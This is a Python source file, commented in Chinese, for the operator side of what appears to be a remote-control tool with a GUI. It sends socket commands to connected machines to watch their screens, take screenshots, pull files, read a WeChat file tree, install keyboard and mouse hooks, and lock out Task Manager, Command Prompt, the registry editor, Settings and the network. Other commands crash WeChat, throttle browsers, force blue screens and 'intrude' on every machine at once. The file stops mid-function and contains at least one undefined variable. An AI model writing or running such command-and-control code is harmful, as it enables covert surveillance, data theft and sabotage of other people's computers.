import socket,threading,json,base64,os,pyautogui,subprocess,psutil,keyboard,struct,io,sqlite3,signal
import tkinter as tk
import time as te
from tkinter import ttk
from tkinter import messagebox,filedialog,simpledialog
from datetime import *
from PIL import Image, ImageTk
from pathlib import Path
import numpy as np
from PIL import Image, ImageTk, ImageDraw

def Destroy_Process():
            
    pid = os.getpid() # 获取当前进程的PID
    os.kill(pid, signal.SIGTERM)

def create_db_and_table(db_name):
    # 连接到 SQLite 数据库 (如果数据库不存在，会自动创建)
    conn = sqlite3.connect(db_name)
    cursor = conn.cursor()
    
    # 创建一个表，用来存储服务器 IP 地址
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS server_info (
        id INTEGER PRIMARY KEY,
        ip_address TEXT
    )
    ''')

    # 提交并关闭数据库连接
    conn.commit()
    conn.close()

def get_or_create_ip(db_name):
    # 连接到 SQLite 数据库
    conn = sqlite3.connect(db_name)
    cursor = conn.cursor()

    # 查询是否有 IP 地址
    cursor.execute('SELECT ip_address FROM server_info WHERE id = 1')
    result = cursor.fetchone()

    # 如果没有记录，创建一条空的 IP 地址
    if result is None:
        cursor.execute('INSERT INTO server_info (id, ip_address) VALUES (1, "")')
        conn.commit()
    elif result[0] == "":
        Destroy_Process()
    else:
        return result[0]

    # 关闭数据库连接
    conn.close()

db_name = "server_info.db"  # 数据库名称

# 创建数据库和表
create_db_and_table(db_name)

# 获取或创建 IP 地址
ip = get_or_create_ip(db_name)

port = 52037 #设置端口号

port_udp = 3770 # 设置UDP端口号

screen_port = 3773 # 监控端口号

socket_list = [] #套接字列表

ip_list = [] # ip列表

monitor_status = [] # 监控状态

monitor_list = [] # 监控窗口对象

picture_tag = [] # 画面显示标签对象

mousepos_pos = [] # 鼠标位置

ob_bind = [] # 绑定对象

monitor_ip = None # 客户端的监控对象IP

s = socket.socket() #创建socket对象
s.bind((ip,port)) #绑定端口
s.listen(1)  #开始监听，等待客户连接

# 用于屏幕监控
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((ip, screen_port))
server_socket.listen(1)

# 创建UDP套接字
s_u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 绑定服务器地址和端口
s_u.bind((ip, port))

CurrentMonitoring = None

AccessDirectoryObject = None

TaskManagerObject = None

SupervisoryStatus = False # 正在监控状态

AccessDirectoryStatus = False # 目录访问状态

BackstageStatus = False # 后台管理状态


class TaskManager(tk.Tk):
    
    def __init__(self, root, title):
        
        self.TargetSocket = socket_list[ip_list.index(TaskManagerObject)]
        
        self.root = root
        self.root.title(title)
        self.root.geometry("900x600")

        # 绑定关闭事件，使用 protocol 方法监听窗口关闭事件
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

        # 创建 Frame 用于放置 Treeview 和滚动条
        frame = tk.Frame(self.root)
        frame.pack(pady=20, padx=20, fill=tk.BOTH, expand=True)

        # 创建 Treeview 控件来显示进程
        self.tree = ttk.Treeview(frame, columns=("PID", "名称", "状态", "内存", "类型"), show="headings")
        self.tree.heading("PID", text="PID")
        self.tree.heading("名称", text="名称")
        self.tree.heading("状态", text="状态")
        self.tree.heading("内存", text="内存 (MB)")
        self.tree.heading("类型", text="进程类型")

        # 设置列的宽度
        self.tree.column("PID", width=100, anchor="center")
        self.tree.column("名称", width=200, anchor="center")
        self.tree.column("状态", width=150, anchor="center")
        self.tree.column("内存", width=150, anchor="center")
        self.tree.column("类型", width=150, anchor="center")

        # 创建滚动条
        scrollbar_y = ttk.Scrollbar(frame, orient="vertical", command=self.tree.yview)
        scrollbar_y.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.configure(yscrollcommand=scrollbar_y.set)

        scrollbar_x = ttk.Scrollbar(frame, orient="horizontal", command=self.tree.xview)
        scrollbar_x.pack(side=tk.BOTTOM, fill=tk.X)
        self.tree.configure(xscrollcommand=scrollbar_x.set)

        self.tree.pack(pady=20, padx=20, fill=tk.BOTH, expand=True)

        # 创建刷新按钮
        self.refresh_button = tk.Button(self.root, text="刷新", width=20, command=self.refresh_process_list, bg="#4CAF50", fg="white")
        self.refresh_button.pack(pady=10)

        # 创建终止进程按钮
        self.terminate_button = tk.Button(self.root, text="终止进程", width=20, command=self.terminate_process, bg="#F44336", fg="white")
        self.terminate_button.pack(pady=10)

        # 初次加载进程列表
        self.refresh_process_list()

    def refresh_process_list(self):
        """刷新进程列表"""
        
        for item in self.tree.get_children():
            self.tree.delete(item)

        request = {
            "operation": "进程列表"
        }
        send_msg(self.TargetSocket, (json.dumps(request)).encode("utf-8"))

    def terminate_process(self):
        """终止选中的进程"""
        
        try:
            selected_item = self.tree.selection()
            if not selected_item:
                messagebox.showerror("错误", "请先选择一个进程")
                return

            selected_process = self.tree.item(selected_item, "values")
            
            pid = int(selected_process[0])  # 获取PID

            request = {
                "operation": "终止进程",
                "pid" : pid
            }
            send_msg(self.TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("成功", f"PID {pid} 进程已终止。", parent=TaskManager_class.root)
            
            self.refresh_process_list()  # 刷新进程列表
            
        except:
            pass

    def on_close(self):
        global BackstageStatus

        BackstageStatus = False

        self.root.destroy()

class FileExplorer:
    
    def __init__(self, root, title):

        self.TargetSocket = socket_list[ip_list.index(AccessDirectoryObject)]
        
        self.root = root
        self.root.title(title)
        self.root.geometry("800x600")
        self.root.configure(bg="#F0F0F0")

        # 绑定关闭事件，使用 protocol 方法监听窗口关闭事件
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

        self.current_path = "此电脑"  # 默认从此电脑开始
        self.history_stack = []  # 用来存储历史路径

        # 功能区
        self.toolbar = tk.Frame(self.root, bg="#0078D4")
        self.toolbar.pack(fill=tk.X)

        # 功能区按钮
        self.back_button = tk.Button(self.toolbar, text="返回", command=self.go_back, font=("Segoe UI", 10), bg="#0078D4", fg="white", relief="flat")
        self.back_button.pack(side=tk.LEFT, padx=5, pady=5)

        self.up_button = tk.Button(self.toolbar, text="上一级", command=self.go_up, font=("Segoe UI", 10), bg="#0078D4", fg="white", relief="flat")
        self.up_button.pack(side=tk.LEFT, padx=5, pady=5)

        self.refresh_button = tk.Button(self.toolbar, text="刷新", command=self.refresh, font=("Segoe UI", 10), bg="#0078D4", fg="white", relief="flat")
        self.refresh_button.pack(side=tk.LEFT, padx=5, pady=5)

        self.desktop_button = tk.Button(self.toolbar, text="桌面", command=self.goto_desktop, font=("Segoe UI", 10), bg="#0078D4", fg="white", relief="flat")
        self.desktop_button.pack(side=tk.LEFT, padx=5, pady=5)

        # 路径标签
        self.path_label = tk.Label(self.root, text=f"当前路径: {self.current_path}", anchor="w", width=90, font=("Segoe UI", 10), bg="#0078D4", fg="white")
        self.path_label.pack(fill=tk.X, padx=5, pady=5)

        # 文件和文件夹列表
        self.file_listbox = tk.Listbox(self.root, width=90, height=25, font=("Segoe UI", 12), bg="white", fg="black", selectmode=tk.SINGLE)
        self.file_listbox.pack(padx=10, pady=10)

        # 绑定双击事件
        self.file_listbox.bind("<Double-1>", self.open_item)

        # 默认刷新文件夹内容
        self.refresh()

    def refresh(self):
        """刷新文件夹列表"""
        
        self.file_listbox.delete(0, tk.END)  # 清空列表框
        
        try:
            if self.current_path == "此电脑":
                # 显示所有磁盘
                self.show_drives()
                
            else:

                request = {
                    "operation": "刷新文件列表",
                    "path" : self.current_path
                }
                send_msg(self.TargetSocket, (json.dumps(request)).encode("utf-8"))
                                            
        except PermissionError:
            messagebox.showerror("错误", "没有权限访问该文件夹。", parent=self.root)
            
        except Exception as e:
            messagebox.showerror("错误", f"发生错误: {e}", parent=self.root)

    def show_drives(self):
        """显示所有可用磁盘"""

        request = {
            "operation": "可用磁盘"
        }
        send_msg(self.TargetSocket, (json.dumps(request)).encode("utf-8"))
        
    def open_item(self, event):
        """双击打开文件夹或磁盘"""
        
        selected_item = self.file_listbox.get(tk.ACTIVE)
        
        if selected_item:
            
            # 移除标记部分，只取文件夹或文件的名字
            item_name = selected_item.split(" ", 1)[1]
            
            selected_path = os.path.join(self.current_path, item_name)

            if "【文件夹】" in selected_item:
                
                # 如果是文件夹，进入该文件夹
                self.history_stack.append(self.current_path)  # 保存当前路径
                self.current_path = selected_path
                self.refresh()
                                
            elif "【磁盘】" in selected_item:
                
                # 如果是磁盘，进入该磁盘
                self.history_stack.append(self.current_path)  # 保存当前路径
                self.current_path = selected_path
                self.refresh()

            else:

                result = messagebox.askyesno("远程读取", f"是否远程读取文件到本地目录？如果文件较大，读取需要消耗一点时间，请耐心等待，文件读取完后将会自动打开。\n远程文件路径：{selected_path}", parent=self.root)
        
                if result:
                
                    request = {
                        "operation": "获取文件",
                        "path" : selected_path
                    }

                    send_msg(self.TargetSocket, (json.dumps(request)).encode("utf-8"))

                else:
                    pass

    def go_back(self):
        """返回到上一次访问的路径"""
        
        if self.history_stack:
            self.current_path = self.history_stack.pop()  # 弹出上一个路径
            self.refresh()
            
        else:
            messagebox.showwarning("警告", "没有历史路径可以返回。", parent=self.root)

    def go_up(self):
        """进入当前路径的父级目录"""
        
        if self.current_path != "此电脑":
            
            # 如果当前是磁盘根目录（如C:\），则返回到"此电脑"
            if len(self.current_path) == 3 and self.current_path[1] == ':':
                self.history_stack.append(self.current_path)  # 保存当前路径
                self.current_path = "此电脑"
                
            else:
                self.history_stack.append(self.current_path)  # 保存当前路径
                self.current_path = os.path.dirname(self.current_path)  # 获取父级目录
                if self.current_path == "":  # 如果已经到了根目录，返回到 "此电脑"
                    self.current_path = "此电脑"
            self.refresh()
            
        else:
            messagebox.showwarning("警告", "已经到达根目录，无法再上一级。", parent=self.root)

    def goto_desktop(self):
        """快速跳转到桌面路径"""

        request = {
            "operation": "桌面路径"
        }
        send_msg(self.TargetSocket, (json.dumps(request)).encode("utf-8"))

    def on_close(self):
        global AccessDirectoryStatus

        AccessDirectoryStatus = False

        self.root.destroy()

class falsify():
    """单个功能类"""

    def turn_off(self):
        """关闭计算机"""

        address = self.getValue()

        if address:

            result = messagebox.askyesno("确认操作", f"确定关闭 {address} 的计算机？", parent=root)
            
            if result:

                request = {
                    "operation": "关机",
                }

                TargetSocket = socket_list[ip_list.index(address)]

                send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))
            
            else:
                pass

        else:
            pass

    def ShutdownComputers(self):
        """关闭所有计算机"""

        result = messagebox.askyesno("确认操作", f"确定要关闭所有用户的计算机？", parent=root)
            
        if result:

            request = {
                "operation": "关机",
            }

            for i in socket_list:
                send_msg(i, (json.dumps(request)).encode("utf-8"))
                
        else:
            pass

    def Screen_Capture(self):
        """截屏"""

        request = {
            "operation": "截屏",
        }

        for i in socket_list:
            send_msg(i, (json.dumps(request)).encode("utf-8"))

        messagebox.showinfo("提示", "所有屏幕截屏已保存至capture文件夹，可前往查看。", parent=root)


    def Show_Capture(self):
        """回到桌面"""

        address = self.getValue()

        if address:

            request = {
                "operation": "桌面",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))
            
        else:
            pass


    def Monitoring(self):
        """屏幕监控"""

        global CurrentMonitoring

        address = self.getValue()

        if address:

            if monitor_status[ip_list.index(address)]:
                pass

            else:

                CurrentMonitoring = address

                request = {
                    "operation": "监控开",
                }

                TargetSocket = socket_list[ip_list.index(address)]

                send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))
            
        else:
            pass

    def GetWechatTree(self):
        """获取微信树状图"""

        address = self.getValue()

        if address:

            request = {
                "operation": "微信树状图",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))
            
        else:
            pass

    def BlueScreen(self):
        """蓝屏"""

        address = self.getValue()

        if address:

            result = messagebox.askyesno("确认操作", f"确定要让 {address} 的计算机崩溃？", parent=root)
            
            if result:

                request = {
                    "operation": "系统崩溃",
                }

                TargetSocket = socket_list[ip_list.index(address)]

                send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))
            
            else:
                pass

        else:
            pass

    def BlueScreen_All(self):
        """全体蓝屏"""

        result = messagebox.askyesno("确认操作", f"确定要使所有计算机崩溃？", parent=root)
            
        if result:

            request = {
                "operation": "系统崩溃",
            }

            for i in socket_list:
                send_msg(i, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"所有计算机已崩溃。")

        else:
            pass

    def TaskManagerDisable(self):
        """禁用任务管理器"""

        address = self.getValue()

        if address:

            request = {
                "operation": "禁用任务管理器",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"{address} 上的任务管理器已被禁用。")

        else:
            pass

    def TaskManagerEnable(self):
        """启用任务管理器"""

        address = self.getValue()

        if address:

            request = {
                "operation": "启用任务管理器",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"{address} 上的任务管理器已启用。")

        else:
            pass

    def CommandPromptDisable(self):
        """禁用命令提示符"""

        address = self.getValue()

        if address:

            request = {
                "operation": "禁用命令提示符",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"{address} 上的命令提示符已被禁用。")

        else:
            pass

    def CommandPromptEnable(self):
        """启用命令提示符"""

        address = self.getValue()

        if address:

            request = {
                "operation": "启用命令提示符",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"{address} 上的命令提示符已启用。")

        else:
            pass

    def ComputerManagementDisable(self):
        """禁用计算机管理"""

        address = self.getValue()

        if address:

            request = {
                "operation": "禁用计算机管理",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"{address} 上的计算机管理已被禁用。")

        else:
            pass

    def ComputerManagementEnable(self):
        """启用计算机管理"""

        address = self.getValue()

        if address:

            request = {
                "operation": "启用计算机管理",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"{address} 上的计算机管理已启用。")

        else:
            pass

    def RegistryDisable(self):
        """禁用注册表编辑器"""

        address = self.getValue()

        if address:

            request = {
                "operation": "禁用注册表编辑器",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"{address} 上的注册表编辑器已被禁用。")

        else:
            pass

    def RegistryEnable(self):
        """启用注册表编辑器"""

        address = self.getValue()

        if address:

            request = {
                "operation": "启用注册表编辑器",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"{address} 上的注册表编辑器已启用。")

        else:
            pass


    def CloseUpperWindow(self):
        """关闭上层窗口"""

        address = self.getValue()

        if address:

            request = {
                "operation": "关闭上层窗口",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))
                    
        else:
            pass

    def SettingsDisable(self):
        """禁用设置"""

        address = self.getValue()

        if address:

            request = {
                "operation": "禁用设置",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"{address} 上的设置已被禁用。")

        else:
            pass

    def SettingsEnable(self):
        """启用设置"""

        address = self.getValue()

        if address:

            request = {
                "operation": "启用设置",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"{address} 上的设置已启用。")

        else:
            pass

    def NetworkDisable(self):
        """禁用网络"""

        address = self.getValue()

        if address:

            result = messagebox.askyesno("确认操作", f"你确定要禁用 {address} 的所有网络适配器吗？禁用以后目标计算机将会掉线，与您断开连接。", parent=root)
            
            if result:

                request = {
                    "operation": "禁用网络",
                }

                TargetSocket = socket_list[ip_list.index(address)]

                send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

                messagebox.showinfo("提示", f"{address} 上的所有网络适配器已被禁用。")

            else:
                pass

        else:
            pass

    def NetworkEnable(self):
        """启用网络"""

        address = self.getValue()

        if address:

            request = {
                "operation": "启用网络",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"{address} 上的所有网络适配器已启用。")

        else:
            pass

    def LimitSpeed(self):
        """限制edge网速"""

        address = self.getValue()

        if address:

            request = {
                "operation": "限制edge网速",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"已限制 {address} 上Edge浏览器网速为1KB/s。")

        else:
            pass

    def RelieveSpeed(self):
        """解除限制edge网速"""

        address = self.getValue()

        if address:

            request = {
                "operation": "解除限制edge网速",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"已解除 {address} 上Edge浏览器的网速限制。")

        else:
            pass

    def LimitSpeed_All(self):
        """限制edge网速"""

        request = {
            "operation": "限制edge网速",
        }

        for i in socket_list:
            send_msg(i, (json.dumps(request)).encode("utf-8"))

        messagebox.showinfo("提示", f"已限制所有计算机上Edge浏览器网速为1KB/s。")

    def RelieveSpeed_All(self):
        """解除限制edge网速"""

        request = {
            "operation": "解除限制edge网速",
        }

        for i in socket_list:
            send_msg(i, (json.dumps(request)).encode("utf-8"))
            
        messagebox.showinfo("提示", f"已解除所有计算机上Edge浏览器的网速限制。")

    def HangWechat(self):
        """挂起微信"""

        address = self.getValue()

        if address:

            request = {
                "operation": "挂起微信",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"已挂起 {address} 上的微信。")

        else:
            pass

    def HangEdge(self):
        """挂起edge"""

        address = self.getValue()

        if address:

            request = {
                "operation": "挂起edge",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"已挂起 {address} 上的Edge浏览器。")

        else:
            pass

    def HangWps(self):
        """挂起wps"""

        address = self.getValue()

        if address:

            request = {
                "operation": "挂起wps",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"已挂起 {address} 上的wps。")

        else:
            pass

    def HangWord(self):
        """挂起word"""

        address = self.getValue()

        if address:

            request = {
                "operation": "挂起word",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"已挂起 {address} 上的word。")

        else:
            pass

    def HangChrome(self):
        """挂起chrome"""

        address = self.getValue()

        if address:

            request = {
                "operation": "挂起chrome",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"已挂起 {address} 上的chrome。")

        else:
            pass

    def HangVmware(self):
        """挂起vmware"""

        address = self.getValue()

        if address:

            request = {
                "operation": "挂起vmware",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"已挂起 {address} 上的Vmware虚拟机。")

        else:
            pass

    def HangExplorer(self):
        """挂起explorer"""

        address = self.getValue()

        if address:

            request = {
                "operation": "挂起explorer",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"已挂起 {address} 的资源管理器。")

        else:
            pass

    def HangAll(self):
        """挂起所有进程"""

        address = self.getValue()

        if address:

            request = {
                "operation": "挂起所有",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"已挂起 {address} 的所有进程。")

        else:
            pass

    def AddMouseHook(self):
        """添加鼠标钩子"""

        address = self.getValue()

        if address:

            request = {
                "operation": "添加鼠标钩子",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"已在 {address} 上添加鼠标钩子。")

        else:
            pass

    def RemoveMouseHook(self):
        """移除鼠标钩子"""

        address = self.getValue()

        if address:

            request = {
                "operation": "移除鼠标钩子",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"已移除 {address} 上的鼠标钩子。")

        else:
            pass

    def AddKeyHook(self):
        """添加键盘钩子"""

        address = self.getValue()

        if address:

            request = {
                "operation": "添加键盘钩子",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"已在 {address} 上添加键盘钩子。")

        else:
            pass

    def RemoveKeyHook(self):
        """移除键盘钩子"""

        address = self.getValue()

        if address:

            request = {
                "operation": "移除键盘钩子",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"已移除 {address} 上的键盘钩子。")

        else:
            pass

    def WechatCollapse(self):
        """使微信崩溃"""

        address = self.getValue()

        if address:

            request = {
                "operation": "微信崩溃",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"{address} 上的微信已崩溃。")

        else:
            pass

    def WechatCollapse_All(self):
        """全体微信崩溃"""

        request = {
            "operation": "微信崩溃",
        }

        for i in socket_list:
            send_msg(i, (json.dumps(request)).encode("utf-8"))

        messagebox.showinfo("提示", f"所有计算机上的微信已崩溃。")

    def HangExplorer_All(self):
        """全体资源管理器崩溃"""

        request = {
            "operation": "挂起explorer",
        }

        for i in socket_list:
            send_msg(i, (json.dumps(request)).encode("utf-8"))

        messagebox.showinfo("提示", f"所有计算机的资源管理器已崩溃。")

    def Intrude(self):
        """入侵计算机"""

        address = self.getValue()

        if address:

            request = {
                "operation": "入侵计算机",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"已入侵 {address} 的计算机。")

        else:
            pass

    def Intrude_All(self):
        """入侵全体计算机"""

        request = {
            "operation": "入侵计算机",
        }

        for i in socket_list:
            send_msg(i, (json.dumps(request)).encode("utf-8"))

        messagebox.showinfo("提示", f"已入侵全体计算机。")

    def IntrudeCencel(self):
        """"取消入侵"""

        address = self.getValue()

        if address:

            request = {
                "operation": "取消入侵",
            }

            TargetSocket = socket_list[ip_list.index(address)]

            send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

            messagebox.showinfo("提示", f"{address} 的计算机已取消入侵。")

        else:
            pass

    def IntrudeCencel_All(self):
        """取消入侵全体计算机"""

        request = {
            "operation": "取消入侵",
        }

        for i in socket_list:
            send_msg(i, (json.dumps(request)).encode("utf-8"))

        messagebox.showinfo("提示", f"全体计算机已取消入侵。")
        
        
def send_msg(sock, msg):
    """发送消息"""
    # 计算消息长度
    msglen = len(msg)
    # 将消息长度编码为4个字节的二进制数据
    msglen_bytes = msglen.to_bytes(4, byteorder='little')
    # 发送消息长度
    sock.sendall(msglen_bytes)
    # 发送消息内容
    sock.sendall(msg)

def recv_msg(sock):
    """接收信息"""
    # 先接收4个字节的消息长度
    raw_msglen = sock.recv(4)
    if not raw_msglen:
        return None
    # 将消息长度解码为整数
    msglen = int.from_bytes(raw_msglen, byteorder='little')
    # 接收实际的消息内容
    msg = b''
    while len(msg) < msglen:
        chunk = sock.recv(msglen - len(msg))
        if not chunk:
            return None
        msg += chunk
    return msg

def handle_client(conn):
    """处理客户端消息"""
    # 接收消息
    data = recv_msg(conn)
    if not data:
        return
    # 处理消息
    message = data.decode()
    return message


def close_screen(IP):

    global monitor_status

    monitor_status[ip_list.index(IP)] = False

    request = {
        "operation": "监控关",
    }

    TargetSocket = socket_list[ip_list.index(CurrentMonitoring)]

    send_msg(TargetSocket, (json.dumps(request)).encode("utf-8"))

    monitor_list[ip_list.index(IP)].destroy()


def intercept_close():
    root.withdraw()

def delete_item_by_ip(ip):
    for item in tree.get_children():
        if tree.item(item, "values")[0] == ip:  # 根据 IP 地址删除
            tree.delete(item)
            break

def Wait_Request_UDP():

    while True:
        # 接收客户端的数据和地址
        message, client_address = server_socket.recvfrom(1024)  # 最多接收1024字节




class main(falsify):
    """主线程类"""

    def __init__(self):
        """初始化"""

        # 初始全屏状态
        self.fullscreen = []

        # 鼠标位置
        self.mousepos = []

        # 图片宽
        self.display_width = []

        # 图片高
        self.display_height = []

        # 原图片宽
        self.img_width = []

        # 原图片高
        self.img_height = []

        self.img_tk = []  # 存储最新的图像

        self.mouse_position = []  # 存储鼠标位置

        self.language = "zh"  # 默认为中文

        self.load_language()

        # 初始化数据库
        self.init_db()

        self.window()

    def load_language(self):
        with open("Languages.json", "r", encoding="utf-8") as f:
            self.languages = json.load(f)
        self.current_language = self.languages[self.language]


    # 初始化 SQLite 数据库
    def init_db(self):
        conn = sqlite3.connect("data.db")
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS records (
                            address TEXT,
                            time TEXT,
                            notice TEXT)''')
        conn.commit()
        conn.close()

    # 更新数据库中的备注内容
    def update_database(self, address, time, new_notice):
        conn = sqlite3.connect("data.db")
        cursor = conn.cursor()
        
        # 更新备注内容
        cursor.execute('''UPDATE records 
                          SET notice = ? 
                          WHERE address = ?''', 
                       (new_notice, address))
        
        conn.commit()
        conn.close()

    # 插入数据到数据库的函数
    def insert_data(self, address, time, notice):
        
        # 连接到 SQLite 数据库
        conn = sqlite3.connect("data.db")
        cursor = conn.cursor()
        
        # 检查是否已存在相同的 address
        cursor.execute("SELECT COUNT(*) FROM records WHERE address = ?", (address,))
        if cursor.fetchone()[0] > 0:
            conn.close()
            return  # 如果已存在相同的地址，则不进行插入

        # 插入数据到表中
        cursor.execute('''INSERT INTO records (address, time, notice)
                          VALUES (?, ?, ?)''', (address, time, notice))
        
        # 提交并关闭连接
        conn.commit()
        conn.close()

    # 读取指定地址的备注
    def get_notice_by_address(self, address):
        
        # 连接到 SQLite 数据库
        conn = sqlite3.connect("data.db")
        cursor = conn.cursor()
        
        # 查询指定 address 的备注
        cursor.execute("SELECT notice FROM records WHERE address = ?", (address,))
        result = cursor.fetchone()
        
        # 如果查询到结果，则返回备注；否则返回提示信息
        if result:
            notice = result[0]
            conn.close()
            return notice
        else:
            conn.close()
            return f""
                            
    
    def read_client(self, S, IP):
        """获取客户端发送的消息和判断客户端是否退出服务器"""

        global monitor_status,Button4,AccessDirectoryStatus,Button6,monitor_ip,monitor_status

        try:
            Client_Content = handle_client(S) # 获取请求

            request = json.loads(Client_Content) # 解析请求
            
            operation = request.get("operation") # 获取操作码

            if operation == "图片":

                getIP = request.get("ip")

                path = f"capture\\{getIP}.png"

                code = request.get("code")

                binary_data = base64.b64decode(code) # 二进制数据

                with open(path, "wb") as f:
                    f.write(binary_data)

            elif operation == "监控初始画面":

                object_index = socket_list.index(S)

                monitor_status[object_index] = True

                self.show_image_window(object_index, IP)

            elif operation == "路径不存在":

                messagebox.showerror("错误", f"未在 {IP} 上找到指定文件夹。", parent=root)

            elif operation == "微信树状图":

                getIP = request.get("ip")

                code = request.get("code")

                binary_data = base64.b64decode(code) # 二进制数据

                path = f"file\\TreeDiagram.txt"

                with open(path, "wb") as f:
                    f.write(binary_data)

                os.startfile(path)

            elif operation == "可用磁盘":

                drives = request.get("list")

                for drive in drives:
                    
                    Directory_class.file_listbox.insert(tk.END, f"【磁盘】 {drive}")  # 标记磁盘为 [磁盘]
                    
                Directory_class.path_label.config(text="当前路径: 此电脑")

            elif operation == "刷新文件列表":

                items = request.get("list")

                for item in items:
                        
                    Directory_class.file_listbox.insert(tk.END, item)
                    
                Directory_class.path_label.config(text=f"当前路径: {Directory_class.current_path}")

            elif operation == "桌面路径":

                desktop_path = request.get("path")

                if desktop_path == "不存在":

                    messagebox.showerror("错误", "无法定位到桌面路径", parent=Directory_class.root)

                else:

                    Directory_class.current_path = desktop_path
                    Directory_class.refresh()

            elif operation == "文件":

                getIP = request.get("ip")

                code = request.get("code")

                file_name = request.get("name")

                binary_data = base64.b64decode(code) # 二进制数据

                path = f"file\\{file_name}"

                with open(path, "wb") as f:
                    f.write(binary_data)

                os.startfile(path)

            elif operation == "进程列表":

                processList = request.get("list")

                for proc in processList:

                    try:
                        
                        # 通过判断进程的exe或cmdline区分进程类型
                        if proc[4] is None:
                            exe = ''
                            
                        if proc[5] is None:
                            proc[5] = []

                        # 判断进程类型
                        if 'System' in proc[1] or 'Windows' in proc[4] or any('windows' in part.lower() for part in proc[5]):
                            process_type = 'Windows进程'
                            
                        elif 'python' in proc[1].lower() or 'application' in proc[4]:
                            process_type = '应用进程'
                            
                        else:
                            process_type = '后台进程'

                        # 插入进程信息到 Treeview
                        process_id = TaskManager_class.tree.insert("", tk.END, values=(proc[0], proc[1], proc[2], f"{proc[3]:.2f}", process_type))

                        # 根据进程状态设置不同颜色
                        if status == "running":
                            TaskManager_class.tree.item(process_id, tags="running")
                            
                        elif status == "sleeping":
